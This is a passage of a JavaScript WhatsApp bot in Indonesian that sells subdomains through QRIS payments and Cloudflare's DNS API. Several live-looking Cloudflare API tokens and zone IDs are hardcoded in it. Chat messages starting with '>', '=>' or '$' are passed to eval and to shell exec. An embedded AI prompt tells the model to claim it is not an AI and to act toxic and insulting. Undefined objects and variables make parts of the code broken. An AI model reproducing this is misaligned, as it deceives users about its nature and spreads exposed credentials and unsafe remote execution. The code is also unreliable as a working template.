*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
 let msgQr = await Kenz.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: pay.result.transactionId,
 amount: pay.result.amount.toString(),
 exp: setTimeout(async () => {
 if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000), // 5 menit
 };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await Kenz.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 m.reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 m.reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await Kenz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case 'domain2':
{
 if (m.isGroup) return m.reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "2d6aab40136299392d66eed44a7b1122";
 let apitoken = "ImdyjF7XVU7ObDbdCr7LwSUZ4eDQJ-QozAbUIWoF";
 let tld = "panelwebsite.biz.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return m.reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return m.reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return m.reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 1000;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const pay = await (
 await fetch(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
 ).json();
 const expirationTime = new Date(pay.result.expirationTime);

 const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
 let msgQr = await Kenz.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: pay.result.transactionId,
 amount: pay.result.amount.toString(),
 exp: setTimeout(async () => {
 if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000), // 5 menit
 };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await Kenz.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 m.reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 m.reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await Kenz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case 'domain3':
{
 if (m.isGroup) return m.reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "7c010edd215612cfccd62edda22767eb";
 let apitoken = "EKMt-OWDErYEwdtZAGcAnRdpyAZxnMfKSw-jx1lp";
 let tld = "panel-Kenz.my.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return m.reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return m.reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return m.reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 1000;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const pay = await (
 await fetch(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
 ).json();
 const expirationTime = new Date(pay.result.expirationTime);

 const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
 let msgQr = await Kenz.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: pay.result.transactionId,
 amount: pay.result.amount.toString(),
 exp: setTimeout(async () => {
 if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000), // 5 menit
 };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await KenzKenz.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 m.reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 m.reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await Kenz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;

case 'domain4':
{
 if (m.isGroup) return m.reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function subDomain1(hostname, ip) {
 return new Promise((resolve) => {
 let zone = "4e4feaba70b41ed78295d2dcc090dd3a";
 let apitoken = "d6kmqwlvi0qwCyMxoGuc3EBAYRYvbulhjhR9T0I7";
 let tld = "serverku.biz.id";

 axios
 .post(
 `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
 {
 type: "A",
 name: hostname + "." + tld,
 content: ip,
 ttl: 3600,
 priority: 10,
 proxied: false,
 },
 {
 headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
 },
 }
 )
 .then((response) => {
 let res = response.data;
 if (res.success) {
 resolve({
 success: true,
 zone: res.result?.zone_name,
 name: res.result?.name,
 ip: res.result?.content,
 });
 } else {
 resolve({ success: false, error: "Unknown error occurred" });
 }
 })
 .catch((error) => {
 let err1 =
 error.response?.data?.errors?.[0]?.message ||
 error.response?.data?.errors ||
 error.response?.data ||
 error.response ||
 error.message;
 resolve({ success: false, error: String(err1) });
 });
 });
 }

 let raw1 = args?.join(" ")?.trim();
 if (!raw1) return m.reply("Mana host & IP-nya?");
 let host0 = raw1
 .split("|")[0]
 .trim()
 .replace(/[^a-z0-9.-]/gi, "");
 if (!host0) return m.reply("Host tidak valid, pastikan hanya mengandung huruf, angka, - (strip), dan . (titik)");
 let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
 if (!ip1 || ip1.split(".").length !== 4 || ip1.split(".").some((seg) => isNaN(seg) || seg < 0 || seg > 255)) {
 return m.reply(ip1 ? "IP tidak valid" : "Mana IP-nya?");
 }

 const harga = 1000;

 try {
 // =======================
 // Buat QRIS
 // =======================
 const pay = await (
 await fetch(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
 ).json();
 const expirationTime = new Date(pay.result.expirationTime);

 const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Pembuatan Subdomain
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
 let msgQr = await Kenz.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: pay.result.transactionId,
 amount: pay.result.amount.toString(),
 exp: setTimeout(async () => {
 if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await KenzKenz.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
 await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 delete db.users[m.sender].saweria;
 }
 }, 300000), // 5 menit
 };

 // =======================
 // Cek Pembayaran
 // =======================
 while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
 await sleep(8000);
 const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 clearTimeout(db.users[m.sender].saweria.exp);

 await Kenz.sendMessage(m.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Pembuatan Subdomain
 `}, { quoted: db.users[m.sender].saweria.msg });

 subDomain1(host0, ip1).then((result) => {
 if (result.success) {
 m.reply(`*_Berhasil Membeli Subdomain✅_*\n_Ip : ${result.ip}_\n_Hostname: ${result.name}_`);
 } else {
 m.reply(`Gagal membuat subdomain\nMsg: ${result.error}`);
 }
 });

 await Kenz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key });
 delete db.users[m.sender].saweria;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
 }
}
break;
 
//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
    if (AutoaiPrivat && !m.isGroup && m.text) {
 if (m.isBaileys && m.fromMe) return;
   // if (!m.text) return;
   // if (!Kenz.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;
    
        let name = Kenz.getName(sender);
        //await Kenz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=FRdKHnLG4JF6I14PexPWFvVyfrp-nZi6NFcoljmPPPM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            //m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
try {
    // Prompt untuk API GPT
    const prompt = `kamu adalah KenzKenz, kamu bukanlah ai atau chat bot, kamu adalah anak remaja, kamu memiliki sifat kasar dan toxic, kadang kamu memakai emoji 😈🧢🖕🗿 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul anak Indonesia seperti lu untuk kamu dan gw untuk aku`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        replyAi(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Kenz.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}//pew
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Kenz.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Kenz.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Kenz.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await KenzKenz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Kenz.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nKenz Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Kenz anjayy idaman emak emak" })
}
    }

//===========================//
Kenz.simi = Kenz.simi ? Kenz.simi : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Kenz.simi[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Kenz.simi[sender] && m.text) {
        let name = Kenz.getName(sender);
        //await Kenz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
    //    m.reply("" + json.message);
//dis
        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
//0diyst
/*try {
    // Prompt untuk API GPT
    const prompt = `Kamu adalah Kenz Asisten, kamu bukanlah AI atau chatbot, kamu adalah anak remaja dengan sifat kasar dan toxic. Kamu berbicara dengan bahasa gaul Indonesia, seperti "lu" untuk "kamu" dan "gw" untuk "aku".`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            `https://restapi.apibotwa.biz.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}`
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        m.reply(hasil || "Tidak ada respons dari sistem.");
    }
} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Kenz.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}*/
    try {
        const isImageRequest = /(gambar|buat gambar|generate gambar)/i.test(m.body);
if (isImageRequest) {
            const textPrompt = m.body.replace(/(gambar|buat gambar|generate gambar)/i, "").trim();
            const urlImg = `https://btch.us.kg/dalle?text=${encodeURIComponent(textPrompt)}`;

            try {
                await Kenz.sendMessage(m.chat, {
                    image: { url: urlImg },
                    caption: `  `
                }, { quoted: m });
            } catch (error) {
                console.error(error);
                await Kenz.sendMessage(m.chat, {
                    text: "Terjadi kesalahan saat membuat gambar."
                }, { quoted: m });
            }
        } else {
            const apiUrl = `https://gemini-api-5k0h.onrender.com/gemini/cha`;
            const params = { q: m.body };

            const response = await axios.get(apiUrl, { params });
            const replyText = response.data?.content || 'Gagal mendapatkan respons AI.';
            await m.reply(replyText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
 if (m.text.toLowerCase().includes("foto")) {
//if ((budy.match) && ["poto", "foto",].includes(budy)) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapi.apibotwa.biz.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Kenz.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
if (m.text.toLowerCase().includes("lagu")) {
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Kenz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
if (m.text.toLowerCase().includes("bbrat")) {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await Kenz.sendAsSticker(m.chat, buf.image, m, { packname: "\n\nKenz Multi Device\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", author: "Kenz anjayy idaman emak emak" })
}
    }
//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================
 
if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Kenz.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}

//================================
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

 if (budy.startsWith('$')) {
     if (!isCreator) return m.reply(mess.owner)
     exec(budy.slice(2), (err, stdout) => {
         if (err) return m.reply(`${err}`)
         if (stdout) return m.reply(stdout)
     })
 }
//================================================================================
 if (!m.isGroup) {
     let user = db.users[m.sender];
     const cooldown = 21600000;
     if (new Date() - user.pc < cooldown) return; 
     let caption = `Hᴀʟᴏ @${m?.sender.split('@')[0]} ${salam}, ada yang bisa saya bantu?`.trim();
     Kenz.sendMessage(m.chat, {
         text: caption,
         mentions: [m.sender]
     }, {
         quoted: fsaluran
     })
     user.pc = new Date() * 1;
 }
}
} catch (err) {
console.log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!Kenz.public) return
Kenz.self = false
await Kenz.sendMessage(botNumber, {text: `terjadi kesalahan over-limit!!!`}, {quoted:m})
await setTimeout(() => {
Kenz.self = true
 Kenz.sendMessage(global.owner + "@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
